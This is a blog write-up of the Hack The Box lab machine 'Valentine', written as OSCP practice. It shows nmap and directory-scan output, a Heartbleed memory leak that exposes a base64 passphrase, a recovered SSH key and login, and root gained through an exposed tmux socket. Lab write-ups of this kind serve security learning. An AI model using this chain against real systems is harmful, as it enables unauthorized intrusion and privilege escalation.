

---
title : HTB 1/20 Valentine
published : true
date: 2021-04-10T16:40:05+02:00
author : PS
---
# Quick Note!
A few days ago a friend of mine  gave me a htb pro subs for 30 days :D , so in order to prepare for OSCP  
I will make at least 20 machines till my subs is gone  
I will post writeups for all of those machines on the blog  

### Valentine  

*Nmap*
```bash
>>> sudo nmap -sC -sV 10.10.10.79 | tee namp
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 15:40 EEST
Nmap scan report for 10.10.10.79
Host is up (0.083s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2021-04-10T12:40:28+00:00; +2s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds
```
Going on the port 80 , we get an interesting result  

![test](1.png)

![test](2.png)
Nothing helpful , so time for lulzbuster  
```bash  

[+] game started

[+] code   size   real size   resp time   url

[*] 403 |  288B |      288B | 0.252547s | http://10.10.10.79/.htaccess
[*] 403 |  288B |      288B | 0.404998s | http://10.10.10.79/.htpasswd
[*] 403 |  283B |      283B | 0.407550s | http://10.10.10.79/.hta
[*] 403 |  287B |      287B | 0.188165s | http://10.10.10.79/cgi-bin/
[*] 200 |  552B |      552B | 0.176609s | http://10.10.10.79/decode
[*] 301 |  308B |      308B | 0.171988s | http://10.10.10.79/dev
[*] 200 |  554B |      554B | 0.158954s | http://10.10.10.79/encode
[*] 200 |   38B |       38B | 0.162534s | http://10.10.10.79/index
[*] 200 |   38B |       38B | 0.163341s | http://10.10.10.79/index.php
[*] 403 |  292B |      292B | 0.161239s | http://10.10.10.79/server-status
[*] 200 |   38B |       38B | 1.146707s | http://10.10.10.79/

[+] game over
```
The indexes return the / page content  

![test](3.png)  

![test](4.png)
![test](5.png)
The notes seem interesting  
![test](6.png)
So after spending some more time , I've reutured to / and it hit me HEARTBLEED!  
<https://github.com/sensepost/heartbleed-poc> -- exploit  
Then after running it a few times,  we get a base64 string  
```bash
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D A0  mV0aGVoeXBlCg==.
  0160: 64 51 7F F5 71 CB 53 FE 93 89 86 E5 2F 11 8B 6B  dQ..q.S...../..k
  0170: 6E C1 31 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  n.1.............
```
More exactly :  
```bash
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== -> heartbleedbelievethehype
```
Now , I've remembered about another interesting find in the /dev folder : hype_key  
![test](7.png)
Decode that and get a ssh key  
![test](8.png)
I guessed that the user the hype since the file is called hype_key soooo  
```bash
ssh -i key.key hype@10.10.10.79 
```
![test](9.png)
![test](10.png)
:)) so the ssh pass is not the same with the user one  
After running some linpeas we find :  
```bash
/.devs/dev_sess
```
so just run tmux  -S /.devs/dev_sess and you are root  
![test](11.png)
